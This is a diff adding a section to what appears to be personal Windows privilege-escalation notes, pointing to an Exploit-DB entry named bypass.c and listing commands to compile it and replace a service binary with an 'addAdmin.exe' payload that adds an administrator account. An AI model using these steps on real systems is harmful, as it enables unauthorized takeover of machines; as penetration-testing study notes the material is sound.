@@ -225,6 +225,24 @@ SharpUp.exe UnattendedInstallFiles
 SharpUp.exe UnquotedServicePath
 ```
 
+## bypass.c - https://www.exploit-db.com/exploits/48789
+
+This is a file that you could make and run 
+
+Build:
+
+```
+x86_64-w64-ming32-gcc bypass.c -o bypass.exe
+```
+Share to target
+replace service
+```
+move bypass.exe bypass.service.exe
+move C:\windows\tasks\addAdmin.exe bypass.exe
+```
+
+Use run as, and golden
+
 ## Winpeas
 ### Quick Check
 ```
